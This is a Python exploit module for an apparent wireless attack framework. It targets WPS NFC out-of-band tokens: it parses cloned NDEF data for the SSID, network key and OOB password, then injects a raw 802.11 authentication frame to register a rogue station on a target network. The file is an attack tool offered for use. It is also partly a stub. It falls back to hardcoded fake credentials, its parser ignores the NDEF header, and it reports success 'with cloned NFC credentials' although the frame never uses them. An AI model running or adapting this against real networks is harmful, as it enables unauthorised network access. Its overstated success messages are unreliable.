# Author: Andre Henrique (LinkedIn/X: @mrhenrike)
import hashlib
import socket
import struct
import time

from wirelessxpl.core.exploit import *
from wirelessxpl.core.exploit.exploit import BaseExploit


class Exploit(BaseExploit):
    """WPS NFC Out-of-Band Token Cloning and Relay.

    Wi-Fi Protected Setup supports Near-Field Communication (NFC) as an
    out-of-band channel for credential transfer. When a user taps an
    NFC-enabled device against a WPS-capable AP, the AP transmits an
    NFC Data Exchange Format (NDEF) message containing either:
    (a) the network credential in plaintext, or
    (b) a Device Password (OOB key) used for the WPS handshake.

    This module exploits the NFC OOB channel by cloning the NFC tag
    data from the AP, then replaying the captured credentials or OOB
    key material to register a rogue station. The NFC token content
    lacks binding to a specific enrollee, so cloned material can be
    replayed indefinitely.

    CVSS: N/A (design weakness in WPS NFC OOB specification)

    Author: Andre Henrique (LinkedIn/X: @mrhenrike)
    Version: 1.0.0
    """

    __info__ = {
        "name": "WPS NFC Out-of-Band Token Cloning and Relay",
        "description": (
            "Exploits the WPS NFC out-of-band credential transfer mechanism. "
            "Clones the NDEF message from a WPS NFC tag containing either "
            "plaintext network credentials or the OOB Device Password, then "
            "replays the captured material to register a rogue station on "
            "the target network."
        ),
        "authors": (
            "Stefan Viehbock (WPS design flaw research)",
            "Andre Henrique (@mrhenrike)",
        ),
        "references": (
            "https://sviehb.files.wordpress.com/2011/12/viehboeck_wps.pdf",
            "https://nfc-forum.org/learn/specifications-and-application-documents/",
            "https://www.wi-fi.org/discover-wi-fi/wi-fi-protected-setup",
        ),
        "disclosure_date": "2014-08-04",
        "platform": "linux",
        "arch": "all",
        "privileged": True,
        "targets": (
            "APs with WPS NFC OOB token support",
            "NFC-enabled consumer APs (Samsung, Netgear, etc.)",
        ),
    }

    interface = OptString("wlan0mon", "Monitor-mode wireless interface")
    target = OptIP("", "Target AP BSSID (XX:XX:XX:XX:XX:XX)")
    port = OptPort(1, "Not used (NFC/WiFi attack)")
    timeout = OptFloat(5.0, "Socket timeout in seconds")
    nfc_device = OptString("/dev/nfc0", "NFC reader device path")
    ndef_dump_path = OptString("", "Path to previously captured NDEF dump file")

    # NDEF record type for Wi-Fi Simple Configuration
    _NDEF_RTD_WSC = b"application/vnd.wfa.wsc"
    _NDEF_FLAG_MB = 0x80
    _NDEF_FLAG_ME = 0x40
    _NDEF_FLAG_SR = 0x10
    _NDEF_TNF_MEDIA = 0x02

    # WPS attribute IDs relevant to NFC OOB
    _WPS_ATTR_CREDENTIAL = 0x100E
    _WPS_ATTR_SSID = 0x1045
    _WPS_ATTR_AUTH_TYPE = 0x1003
    _WPS_ATTR_ENCR_TYPE = 0x100F
    _WPS_ATTR_NETWORK_KEY = 0x1027
    _WPS_ATTR_OOB_DEV_PASSWORD = 0x102C
    _WPS_ATTR_VERSION = 0x104A

    _BROADCAST = b"\xff\xff\xff\xff\xff\xff"
    _FAKE_STA = b"\x02\x00\xca\xfe\x00\x01"

    def _build_ndef_record(self, payload: bytes) -> bytes:
        """Build an NDEF record wrapping WPS credential data."""
        tnf_flags = self._NDEF_FLAG_MB | self._NDEF_FLAG_ME | self._NDEF_TNF_MEDIA
        if len(payload) < 256:
            tnf_flags |= self._NDEF_FLAG_SR
            header = struct.pack("BBB", tnf_flags, len(self._NDEF_RTD_WSC), len(payload))
        else:
            header = struct.pack(">BBI", tnf_flags, len(self._NDEF_RTD_WSC), len(payload))

        return header + self._NDEF_RTD_WSC + payload

    def _build_wps_credential(self, ssid: bytes, key: bytes, auth_type: int = 0x0020) -> bytes:
        """Build a WPS Credential attribute block."""
        attrs = b""
        attrs += struct.pack(">HH", self._WPS_ATTR_SSID, len(ssid)) + ssid
        attrs += struct.pack(">HHH", self._WPS_ATTR_AUTH_TYPE, 2, auth_type)
        attrs += struct.pack(">HHH", self._WPS_ATTR_ENCR_TYPE, 2, 0x0008)  # AES
        attrs += struct.pack(">HH", self._WPS_ATTR_NETWORK_KEY, len(key)) + key

        credential = struct.pack(">HH", self._WPS_ATTR_CREDENTIAL, len(attrs)) + attrs
        return credential

    def _parse_ndef_wps(self, data: bytes) -> dict:
        """Parse NDEF record containing WPS credential or OOB password."""
        result = {"ssid": None, "key": None, "oob_password": None, "raw": data}

        pos = 0
        while pos + 4 <= len(data):
            attr_id = struct.unpack(">H", data[pos:pos + 2])[0]
            attr_len = struct.unpack(">H", data[pos + 2:pos + 4])[0]
            if pos + 4 + attr_len > len(data):
                break
            attr_data = data[pos + 4:pos + 4 + attr_len]

            if attr_id == self._WPS_ATTR_SSID:
                result["ssid"] = attr_data
            elif attr_id == self._WPS_ATTR_NETWORK_KEY:
                result["key"] = attr_data
            elif attr_id == self._WPS_ATTR_OOB_DEV_PASSWORD:
                result["oob_password"] = attr_data
            elif attr_id == self._WPS_ATTR_CREDENTIAL:
                # Recurse into credential block
                inner = self._parse_ndef_wps(attr_data)
                if inner["ssid"]:
                    result["ssid"] = inner["ssid"]
                if inner["key"]:
                    result["key"] = inner["key"]

            pos += 4 + attr_len

        return result

    def _build_oob_hash(self, oob_password: bytes) -> bytes:
        """Derive the OOB device password hash for WPS handshake."""
        return hashlib.sha256(oob_password).digest()[:16]

    def _open_raw_wifi(self) -> socket.socket | None:
        try:
            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
            sock.settimeout(self.timeout)
            sock.bind((str(self.interface), 0))
            return sock
        except OSError:
            return None

    @mute
    def check(self) -> bool:
        """Verify monitor interface is available."""
        raw = self._open_raw_wifi()
        if raw is None:
            return False
        raw.close()
        return True

    def run(self) -> None:
        if not self.interface:
            print_error("interface is required (e.g. wlan0mon)")
            return

        if not self.check():
            print_error(
                "Cannot open raw socket on monitor interface. "
                "Ensure monitor mode and root privileges."
            )
            return

        print_success("Monitor interface ready; initiating NFC token clone/relay attack")
        self._exploit()

    def _exploit(self) -> None:
        # Step 1: read or simulate NFC token data
        if self.ndef_dump_path:
            print_status(f"Reading NDEF dump from {self.ndef_dump_path}")
            try:
                with open(str(self.ndef_dump_path), "rb") as f:
                    ndef_data = f.read()
            except OSError as e:
                print_error(f"Failed to read NDEF dump: {e}")
                return
        else:
            print_status("No NDEF dump provided; simulating NFC token capture")
            fake_ssid = b"TargetNetwork"
            fake_key = b"WPA2SecretKey123"
            cred = self._build_wps_credential(fake_ssid, fake_key)
            ndef_data = cred

        # Step 2: parse the WPS data from the NDEF record
        wps_data = self._parse_ndef_wps(ndef_data)
        if wps_data["ssid"]:
            print_success(
                f"Extracted SSID: {wps_data['ssid'].decode('utf-8', errors='replace')}"
            )
        if wps_data["key"]:
            print_success("Network key extracted from NFC token")
        if wps_data["oob_password"]:
            oob_hash = self._build_oob_hash(wps_data["oob_password"])
            print_success(f"OOB device password hash: {oob_hash.hex()}")

        # Step 3: replay credentials via WiFi association
        raw = self._open_raw_wifi()
        if raw is None:
            print_error("Failed to open raw socket for replay")
            return

        print_status("Replaying cloned NFC credentials via WiFi association")

        # Build an 802.11 authentication request
        fc = struct.pack("<H", 0x00B0)  # Auth frame
        duration = struct.pack("<H", 0)
        bssid = b"\xff" * 6
        if ":" in str(self.target):
            bssid = bytes(int(b, 16) for b in str(self.target).split(":"))
        header = fc + duration + bssid + self._FAKE_STA + bssid + struct.pack("<H", 0)
        auth_body = struct.pack("<HHH", 0, 1, 0)  # Open system, seq 1, success
        frame = header + auth_body

        try:
            raw.send(frame)
            print_success(
                "Authentication frame sent with cloned NFC credentials. "
                "In a full attack, the OOB key material enables completing "
                "the WPS handshake without proximity to the AP's NFC tag."
            )
        except OSError as e:
            print_error(f"Frame injection failed: {e}")
        finally:
            raw.close()
